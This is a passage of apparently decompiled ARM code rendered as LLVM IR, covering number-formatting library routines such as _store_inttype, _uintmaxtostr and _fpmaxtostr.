dec_label_pc_150fc:                               ; preds = %dec_label_pc_150c8, %dec_label_pc_150f4
  %v0_150fc = load i32, i32* @r1, align 4
  %v1_150fc = inttoptr i32 %v0_150fc to i32*
  %v2_150fc = load i32, i32* %v1_150fc, align 4
  %v3_150fc = add i32 %v0_150fc, 4
  %v4_150fc = inttoptr i32 %v3_150fc to i32*
  %v5_150fc = load i32, i32* %v4_150fc, align 4
  store i32 %v5_150fc, i32* @r1, align 4
  ret i32 %v2_150fc

dec_label_pc_15104:                               ; preds = %dec_label_pc_150f4
  %v7_15104 = icmp eq i32 %v0_150bc, 256
  %v0_15108 = load i32, i32* @r1, align 4
  %v1_15108 = inttoptr i32 %v0_15108 to i32*
  %v2_15108 = load i32, i32* %v1_15108, align 4
  %v2_1510c = urem i32 %v2_15108, 256
  %v2_1510c.v2_15108 = select i1 %v7_15104, i32 %v2_1510c, i32 %v2_15108
  br i1 %v7_15104, label %.thread2, label %dec_label_pc_15114

dec_label_pc_15114:                               ; preds = %dec_label_pc_15104
  %v7_15114 = icmp eq i32 %v0_150bc, 512
  br i1 %v7_15114, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_15114
  %v4_15118 = mul i32 %v2_1510c.v2_15108, 65536
  %v4_1511c = sdiv i32 %v4_15118, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15114, %dec_label_pc_15104, %bb5
  %v0_15120 = phi i32 [ %v2_15108, %dec_label_pc_15114 ], [ %v2_1510c, %dec_label_pc_15104 ], [ %v4_1511c, %bb5 ]
  %v3_15120 = ashr i32 %v0_15120, 31
  store i32 %v3_15120, i32* @r1, align 4
  ret i32 %v0_15120

; uselistorder directives
  uselistorder i32 %v0_15120, { 1, 0 }
  uselistorder i32 %v2_1510c, { 1, 0 }
  uselistorder i32 %v2_15108, { 1, 2, 0 }
  uselistorder i32 %v2_150d8, { 1, 0 }
  uselistorder i32 %v2_150d4, { 1, 2, 0 }
  uselistorder i1 %v2_150f4, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_150fc, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg3 to i8
  %tmp2 = ptrtoint i8* %arg1 to i32
  %v7_15128 = icmp eq i32 %arg2, 256
  br i1 %v7_15128, label %dec_label_pc_15154, label %dec_label_pc_15130

dec_label_pc_15130:                               ; preds = %entry
  %v7_15130 = icmp eq i32 %arg2, 2048
  br i1 %v7_15130, label %dec_label_pc_15138, label %dec_label_pc_15140

dec_label_pc_15138:                               ; preds = %dec_label_pc_15130
  %tmp3 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp3, align 4
  %v5_15138 = add i32 %tmp2, 4
  %v6_15138 = inttoptr i32 %v5_15138 to i32*
  store i32 %arg4, i32* %v6_15138, align 4
  ret i32 %tmp2

dec_label_pc_15140:                               ; preds = %dec_label_pc_15130
  %v7_15140 = icmp eq i32 %arg2, 512
  br i1 %v7_15140, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_15140
  %tmp4 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp4, align 4
  ret i32 %tmp2

.thread:                                          ; preds = %dec_label_pc_15140
  %v4_15144 = sdiv i32 %arg3, 256
  %v1_15150 = trunc i32 %v4_15144 to i8
  %v4_15150 = add i32 %tmp2, 1
  %v5_15150 = inttoptr i32 %v4_15150 to i8*
  store i8 %v1_15150, i8* %v5_15150, align 1
  br label %dec_label_pc_15154

dec_label_pc_15154:                               ; preds = %entry, %.thread
  store i8 %tmp, i8* %arg1, align 1
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %tmp2, { 4, 1, 0, 2, 3 }
  uselistorder i8* %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_15154, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg4, i32* %r7.global-to-local, align 4
  %v1_15160 = icmp slt i32 %arg4, 0
  %v2_15160 = icmp eq i32 %arg4, 0
  store i1 %v2_15160, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v1_15160, label %dec_label_pc_15178, label %dec_label_pc_15198

dec_label_pc_15178:                               ; preds = %entry
  %v1_15178 = icmp slt i32 %arg3, 0
  %v2_15178 = icmp eq i32 %arg3, 0
  store i1 %v2_15178, i1* %cpsr_z.global-to-local, align 1
  %v1_1517c = sub i32 0, %arg4
  store i32 %v1_1517c, i32* %r7.global-to-local, align 4
  br i1 %v1_15178, label %dec_label_pc_15184, label %dec_label_pc_15198

dec_label_pc_15184:                               ; preds = %dec_label_pc_15178
  %v1_15188 = sub i32 0, %arg2
  store i32 %v1_15188, i32* %r5.global-to-local, align 4
  %v2_15188 = icmp eq i32 %arg2, 0
  %v2_1518c = icmp eq i1 %v2_15188, false
  %v5_1518c = sext i1 %v2_1518c to i32
  %v6_1518c = sub i32 %v5_1518c, %arg3
  store i32 %v6_1518c, i32* %r6.global-to-local, align 4
  %v19_1518c = icmp eq i32 %v6_1518c, 0
  store i1 %v19_1518c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_151a0

dec_label_pc_15198:                               ; preds = %dec_label_pc_15178, %entry
  br label %dec_label_pc_151a0

dec_label_pc_151a0:                               ; preds = %dec_label_pc_15184, %dec_label_pc_15198
  %storemerge = phi i8 [ 0, %dec_label_pc_15198 ], [ 1, %dec_label_pc_15184 ]
  store i8 %storemerge, i8* %stack_var_-40, align 1
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_151a8 = load i32, i32* %r7.global-to-local, align 4
  %v2_151b0 = udiv i32 -1, %v0_151a8
  store i32 %v2_151b0, i32* %fp.global-to-local, align 4
  %v2_151c0 = urem i32 -1, %v0_151a8
  %v1_151c4 = add i32 %v2_151c0, 1
  store i32 %v1_151c4, i32* %sb.global-to-local, align 4
  %v9_151c8 = icmp eq i32 %v1_151c4, %v0_151a8
  store i1 %v9_151c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_151c8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_151a0
  %v1_151cc = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_151cc, i32* %sb.global-to-local, align 4
  %v2_151d0 = add i32 %v2_151b0, 1
  store i32 %v2_151d0, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_151a0, %bb
  %v0_151d4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_151d4, i32* %sl.global-to-local, align 4
  %v0_151d8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_151d8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_151dc

dec_label_pc_151dcthread-pre-split:               ; preds = %bb21
  %v0_151dc.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_151e4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_151dc

dec_label_pc_151dc:                               ; preds = %dec_label_pc_151dcthread-pre-split, %.thread
  %v0_1524c = phi i32 [ %v0_151e4.pre, %dec_label_pc_151dcthread-pre-split ], [ %v0_151a8, %.thread ]
  %v0_151f8 = phi i32 [ %v0_151dc.pr, %dec_label_pc_151dcthread-pre-split ], [ %v0_151d4, %.thread ]
  %v2_151dc = icmp eq i32 %v0_151f8, 0
  store i1 %v2_151dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_151dc, label %dec_label_pc_15248, label %dec_label_pc_151ec

dec_label_pc_151ec:                               ; preds = %dec_label_pc_151dc
  %v2_151ec = urem i32 %v0_151f8, %v0_1524c
  %v2_151fc = udiv i32 %v0_151f8, %v0_1524c
  store i32 %v2_151fc, i32* %sl.global-to-local, align 4
  %v0_15208 = load i32, i32* %r6.global-to-local, align 4
  %v2_1520c = urem i32 %v0_15208, %v0_1524c
  %v1_15214 = load i32, i32* %sb.global-to-local, align 4
  %v3_15214 = mul i32 %v1_15214, %v2_151ec
  %v4_15214 = add i32 %v3_15214, %v2_1520c
  store i32 %v4_15214, i32* %r5.global-to-local, align 4
  %v2_1521c = udiv i32 %v0_15208, %v0_1524c
  %v0_15224 = load i32, i32* %fp.global-to-local, align 4
  %v3_15224 = mul i32 %v0_15224, %v2_151ec
  %v4_15224 = add i32 %v3_15224, %v2_1521c
  %v2_1522c = udiv i32 %v4_15214, %v0_1524c
  %v2_15234 = add i32 %v4_15224, %v2_1522c
  br label %dec_label_pc_15268

dec_label_pc_15248:                               ; preds = %dec_label_pc_151dc
  %v0_15248 = load i32, i32* %r6.global-to-local, align 4
  %v2_15260 = udiv i32 %v0_15248, %v0_1524c
  br label %dec_label_pc_15268

dec_label_pc_15268:                               ; preds = %dec_label_pc_151ec, %dec_label_pc_15248
  %storemerge24 = phi i32 [ %v2_15260, %dec_label_pc_15248 ], [ %v2_15234, %dec_label_pc_151ec ]
  %v0_15284 = phi i32 [ %v2_15260, %dec_label_pc_15248 ], [ %v2_15234, %dec_label_pc_151ec ]
  %v1_15284 = phi i32 [ 0, %dec_label_pc_15248 ], [ %v2_151fc, %dec_label_pc_151ec ]
  %v4_15214.pn = phi i32 [ %v0_15248, %dec_label_pc_15248 ], [ %v4_15214, %dec_label_pc_151ec ]
  store i32 %storemerge24, i32* %r6.global-to-local, align 4
  %v0_15270 = urem i32 %v4_15214.pn, %v0_1524c
  %v3_15268 = load i32, i32* %stack_var_0, align 4
  %v2_1526c = icmp ugt i32 %v0_15270, 8
  %v7_1526c = icmp eq i32 %v0_15270, 9
  store i1 %v7_1526c, i1* %cpsr_z.global-to-local, align 1
  %v1_15274 = add i32 %v0_15270, 48
  %v0_1527c = load i32, i32* %r8.global-to-local, align 4
  %v1_1527c = add i32 %v0_1527c, -1
  store i32 %v1_1527c, i32* %r8.global-to-local, align 4
  %v2_15280 = xor i1 %v7_1526c, true
  %v3_15280 = and i1 %v2_1526c, %v2_15280
  %extract.t = trunc i32 %v1_15274 to i8
  br i1 %v3_15280, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_15268
  %v2_15270 = add i32 %v3_15268, %v0_15270
  %extract.t8 = trunc i32 %v2_15270 to i8
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_15268, %bb20
  %v0_15288.off0 = phi i8 [ %extract.t, %dec_label_pc_15268 ], [ %extract.t8, %bb20 ]
  %v2_15284 = or i32 %v0_15284, %v1_15284
  %v4_15284 = icmp eq i32 %v2_15284, 0
  store i1 %v4_15284, i1* %cpsr_z.global-to-local, align 1
  %v3_15288 = inttoptr i32 %v1_1527c to i8*
  store i8 %v0_15288.off0, i8* %v3_15288, align 1
  %v0_1528c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1528c, label %dec_label_pc_15290, label %dec_label_pc_151dcthread-pre-split

dec_label_pc_15290:                               ; preds = %bb21
  %v2_15290 = load i8, i8* %stack_var_-40, align 1
  %v2_15294 = icmp eq i8 %v2_15290, 0
  store i1 %v2_15294, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15294, label %dec_label_pc_15290..thread2_crit_edge, label %bb22

dec_label_pc_15290..thread2_crit_edge:            ; preds = %dec_label_pc_15290
  %v0_152a0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb22:                                             ; preds = %dec_label_pc_15290
  %v3_1529c = load i32, i32* %r8.global-to-local, align 4
  %v4_1529c = add i32 %v3_1529c, -1
  %v5_1529c = inttoptr i32 %v4_1529c to i8*
  store i8 45, i8* %v5_1529c, align 1
  %v6_1529c = load i32, i32* %r8.global-to-local, align 4
  %v7_1529c = add i32 %v6_1529c, -1
  store i32 %v7_1529c, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15290..thread2_crit_edge, %bb22
  %v0_152a0 = phi i32 [ %v0_152a0.pre, %dec_label_pc_15290..thread2_crit_edge ], [ %v7_1529c, %bb22 ]
  ret i32 %v0_152a0

; uselistorder directives
  uselistorder i32 %v0_15270, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1524c, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i8 45, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %dec_label_pc_15268, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_151a0, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, double %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = fptrunc double %arg2 to float
  %tmp183 = bitcast float %tmp to i32
  store i32 %tmp183, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-42 = alloca i8, align 1
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-43 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-38 = alloca i32, align 4
  %stack_var_-78 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_152ac = load i32, i32* @r4, align 4
  store i32 %v3_152ac, i32* %stack_var_-36, align 4
  %v1_152b0 = add i32 %arg4, 8
  %v2_152b0 = inttoptr i32 %v1_152b0 to i8*
  %v3_152b0 = load i8, i8* %v2_152b0, align 1
  %v4_152b0 = zext i8 %v3_152b0 to i32
  store i32 %v4_152b0, i32* %sl.global-to-local, align 4
  store i32 %arg4, i32* %stack_var_-200, align 4
  %v1_152bc = or i32 %v4_152b0, 32
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_152c0 = icmp ult i32 %v1_152bc, 97
  store i1 %v6_152c0, i1* %cpsr_n.global-to-local, align 1
  %v7_152c0 = icmp eq i32 %v1_152bc, 97
  store i1 %v7_152c0, i1* %cpsr_z.global-to-local, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  store i32 %tmp183, i32* %r6.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_152d4 = inttoptr i32 %arg4 to i32*
  %v2_152d4 = load i32, i32* %v1_152d4, align 4
  store i32 %v2_152d4, i32* %r1.global-to-local, align 4
  br i1 %v7_152c0, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_152d8 = add nuw nsw i32 %v4_152b0, 6
  store i32 %v2_152d8, i32* %r3.global-to-local, align 4
  %v2_152e0 = urem i32 %v2_152d8, 256
  store i32 %v2_152e0, i32* %sl.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %v2_152d4, i32* %ip.global-to-local, align 4
  store i32 %arg4, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r7.global-to-local, align 4
  %v1_152f8 = add i32 %arg4, 12
  %v2_152f8 = inttoptr i32 %v1_152f8 to i32*
  %v3_152f8 = load i32, i32* %v2_152f8, align 4
  store i32 %v3_152f8, i32* %r2.global-to-local, align 4
  %v1_152fc = add i32 %arg4, 4
  %v2_152fc = inttoptr i32 %v1_152fc to i32*
  %v3_152fc = load i32, i32* %v2_152fc, align 4
  store i32 %v3_152fc, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_15300 = icmp slt i32 %v2_152d4, 0
  store i1 %v1_15300, i1* %cpsr_n.global-to-local, align 1
  %v2_15300 = icmp eq i32 %v2_152d4, 0
  store i1 %v2_15300, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_15300, label %bb223, label %bb224

bb223:                                            ; preds = %.thread
  store i32 6, i32* %ip.global-to-local, align 4
  br label %bb224

bb224:                                            ; preds = %.thread, %bb223
  %v1_15660 = phi i32 [ %v2_152d4, %.thread ], [ 6, %bb223 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1530c = and i32 %v3_152f8, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1530c = icmp eq i32 %v1_1530c, 0
  store i1 %v2_1530c, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-42, align 1
  br i1 %v2_1530c, label %dec_label_pc_15324, label %dec_label_pc_15330

dec_label_pc_15324:                               ; preds = %bb224
  %v1_15324 = urem i32 %v3_152f8, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15324 = icmp eq i32 %v1_15324, 0
  store i1 %v2_15324, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15324, label %dec_label_pc_15334, label %dec_label_pc_15330

dec_label_pc_15330:                               ; preds = %dec_label_pc_15324, %bb224
  %storemerge = phi i32 [ 43, %bb224 ], [ 32, %dec_label_pc_15324 ]
  %v0_15330.off0 = phi i8 [ 43, %bb224 ], [ 32, %dec_label_pc_15324 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i8 %v0_15330.off0, i8* %stack_var_-42, align 1
  br label %dec_label_pc_15334

dec_label_pc_15334:                               ; preds = %dec_label_pc_15324, %dec_label_pc_15330
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %tmp183, i32* %r2.global-to-local, align 4
  %v7_15350 = fcmp ord double %arg2, 0.000000e+00
  %not.v7_15350 = xor i1 %v7_15350, true
  %v9_15350 = sext i1 %not.v7_15350 to i32
  store i32 %v9_15350, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %not.v7_15350, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_15350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15350, label %dec_label_pc_15364, label %bb226

bb226:                                            ; preds = %dec_label_pc_15334
  store i32 8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15418

dec_label_pc_15364:                               ; preds = %dec_label_pc_15334
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_15374 = fcmp ogt double %arg2, 0.000000e+00
  %v7_15374 = fcmp oeq double %arg2, 0.000000e+00
  %v8_15374 = select i1 %v6_15374, i32 1, i32 -1
  %v9_15374 = select i1 %v7_15374, i32 0, i32 %v8_15374
  store i32 %v9_15374, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_15378 = icmp slt i32 %v9_15374, 0
  store i1 %v1_15378, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_15374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15374, label %dec_label_pc_15380, label %bb227

dec_label_pc_15380:                               ; preds = %dec_label_pc_15364
  %v10_15390 = fdiv double 0x3FF000003FD00000, %arg2
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_1539c = fcmp ogt double %v10_15390, 0.000000e+00
  %v7_1539c = zext i1 %v6_1539c to i32
  store i32 %v7_1539c, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_153a0 = icmp eq i1 %v6_1539c, false
  store i1 %v2_153a0, i1* %cpsr_z.global-to-local, align 1
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15588

bb227:                                            ; preds = %dec_label_pc_15364
  %v10_153f8 = fmul double %arg2, 0x3FD000000001E898
  %v11_153f8 = fptrunc double %v10_153f8 to float
  %v12_153f8 = bitcast float %v11_153f8 to i32
  store i32 %v12_153f8, i32* %r2.global-to-local, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v6_1540c = fcmp olt double %v10_153f8, %arg2
  %v7_1540c = fcmp oeq double %v10_153f8, %arg2
  %v8_1540c = select i1 %v6_1540c, i32 1, i32 -1
  %v9_1540c = select i1 %v7_1540c, i32 0, i32 %v8_1540c
  store i32 %v9_1540c, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_15410 = icmp slt i32 %v9_1540c, 0
  store i1 %v1_15410, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1540c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1540c, label %dec_label_pc_15418, label %dec_label_pc_1545c

dec_label_pc_15418:                               ; preds = %bb226, %bb227
  %v0_15348.v1_1535c8 = phi i32 [ 0, %bb227 ], [ 8, %bb226 ]
  store i32 %arg4, i32* %ip.global-to-local, align 4
  %v2_15420 = add i32 %arg4, 16
  %v3_15420 = inttoptr i32 %v2_15420 to i32*
  store i32 32, i32* %v3_15420, align 4
  %v0_15428 = load i32, i32* %sl.global-to-local, align 4
  %v1_15428 = add i32 %v0_15428, -96
  %v3_15428 = sub i32 95, %v0_15428
  %v4_15428 = and i32 %v3_15428, %v0_15428
  %v5_15428 = icmp slt i32 %v4_15428, 0
  store i1 %v5_15428, i1* %cpsr_v.global-to-local, align 1
  %v6_15428 = icmp slt i32 %v1_15428, 0
  store i1 %v6_15428, i1* %cpsr_n.global-to-local, align 1
  %v7_15428 = icmp eq i32 %v0_15428, 96
  store i1 %v7_15428, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-160, align 4
  %tmp286 = icmp ult i32 %v0_15428, 97
  br i1 %tmp286, label %bb228, label %.thread127

bb228:                                            ; preds = %dec_label_pc_15418
  %v5_1543c = or i32 %v0_15348.v1_1535c8, 4
  store i32 %v5_1543c, i32* %r3.global-to-local, align 4
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_15418, %bb228
  %v4_15440 = phi i32 [ %v5_1543c, %bb228 ], [ 3, %dec_label_pc_15418 ]
  %v4_15440.v0_15348.v1_1535c = select i1 %tmp286, i32 %v4_15440, i32 %v0_15348.v1_1535c8
  store i32 ptrtoint ([4 x i8]* @global_var_1e898.841 to i32), i32* %r2.global-to-local, align 4
  %v2_1544c = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_1544c, i32* %r6.global-to-local, align 4
  %v2_15450 = add i32 %v4_15440.v0_15348.v1_1535c, ptrtoint ([4 x i8]* @global_var_1e898.841 to i32)
  store i32 %v2_15450, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15994

dec_label_pc_1545c:                               ; preds = %bb227
  store i32 8, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  store i32 %tmp183, i32* %r4.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1552c

dec_label_pc_1552c:                               ; preds = %dec_label_pc_1552c, %dec_label_pc_1545c
  %v0_15534 = phi i32 [ 256, %dec_label_pc_1545c ], [ %v3_15534, %dec_label_pc_1552c ]
  %v0_154f0 = phi i32 [ %tmp183, %dec_label_pc_1545c ], [ %v11_154f8, %dec_label_pc_1552c ]
  %stack_var_-192.2 = phi i32 [ 8, %dec_label_pc_1545c ], [ %v2_1551c, %dec_label_pc_1552c ]
  %stack_var_-180.0 = phi i32 [ 9, %dec_label_pc_1545c ], [ %v1_15490, %dec_label_pc_1552c ]
  %v1_15490 = add nsw i32 %stack_var_-180.0, -1
  store i32 ptrtoint (i32* @global_var_1e8ac.844 to i32), i32* %r2.global-to-local, align 4
  %v3_154a4 = mul i32 %v1_15490, 8
  store i32 %v3_154a4, i32* %r3.global-to-local, align 4
  store i32 %v0_154f0, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v2_154b0 = add i32 %v3_154a4, ptrtoint (i32* @global_var_1e8ac.844 to i32)
  store i32 %v2_154b0, i32* %ip.global-to-local, align 4
  %v1_154b8 = inttoptr i32 %v2_154b0 to i32*
  %v2_154b8 = load i32, i32* %v1_154b8, align 4
  %v3_154b8 = sext i32 %v2_154b8 to i64
  %v1_154f0 = sext i32 %v0_154f0 to i64
  %v2_154f0 = bitcast i64 %v1_154f0 to double
  %v8_154f8 = bitcast i64 %v3_154b8 to double
  %v9_154f8 = fdiv double %v2_154f0, %v8_154f8
  %v10_154f8 = fptrunc double %v9_154f8 to float
  %v11_154f8 = bitcast float %v10_154f8 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v11_154f8, i32* %r8.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  %v6_1550c = fcmp ogt double %v9_154f8, 0x4CBEBC20
  %v7_1550c = zext i1 %v6_1550c to i32
  store i32 %v7_1550c, i32* %r0.global-to-local, align 4
  %v2_1551c = add i32 %stack_var_-192.2, %v0_15534
  store i32 %v2_1551c, i32* %r1.global-to-local, align 4
  store i32 %v11_154f8, i32* %r4.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %v1_15490, i32* %r2.global-to-local, align 4
  %v2_15530 = icmp eq i32 %v1_15490, 0
  %v3_15534 = sdiv i32 %v0_15534, 2
  br i1 %v2_15530, label %dec_label_pc_1553c, label %dec_label_pc_1552c

dec_label_pc_1553c:                               ; preds = %dec_label_pc_1552c
  %v6_1554c = fcmp ogt double %v9_154f8, 0x4E6E6B2A
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15550 = icmp eq i1 %v6_1554c, false
  store i1 %v2_15550, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 1092616194, i32* %r2.global-to-local, align 4
  %v10_15570 = fdiv double %v9_154f8, 0x4024000041F00000
  %v11_15570 = fptrunc double %v10_15570 to float
  %v12_15570 = bitcast float %v11_15570 to i32
  store i32 %v12_15570, i32* %r0.global-to-local, align 4
  store i32 520, i32* %r3.global-to-local, align 4
  store i32 %v12_15570, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15588

dec_label_pc_15588:                               ; preds = %dec_label_pc_15380, %dec_label_pc_1553c
  %v0_1559473 = phi i32 [ %tmp183, %dec_label_pc_15380 ], [ %v12_15570, %dec_label_pc_1553c ]
  %stack_var_-192.6 = phi i32 [ -1, %dec_label_pc_15380 ], [ 520, %dec_label_pc_1553c ]
  %v2_15588 = ptrtoint i32* %stack_var_-77 to i32
  store i32 %v2_15588, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_15590

dec_label_pc_15590:                               ; preds = %dec_label_pc_15624.dec_label_pc_15590_crit_edge, %dec_label_pc_15588
  %v0_155c8 = phi i32 [ %v0_15594.pre, %dec_label_pc_15624.dec_label_pc_15590_crit_edge ], [ %v0_1559473, %dec_label_pc_15588 ]
  %v0_155cc = phi i32 [ %v0_15590.pre, %dec_label_pc_15624.dec_label_pc_15590_crit_edge ], [ %arg3, %dec_label_pc_15588 ]
  store i32 %v0_155cc, i32* %r1.global-to-local, align 4
  %v1_15598 = sext i32 %v0_155c8 to i64
  %v2_15598 = bitcast i64 %v1_15598 to double
  %v3_15598 = fptoui double %v2_15598 to i32
  store i32 %v3_15598, i32* %r4.global-to-local, align 4
  store i32 %v3_15598, i32* %r0.global-to-local, align 4
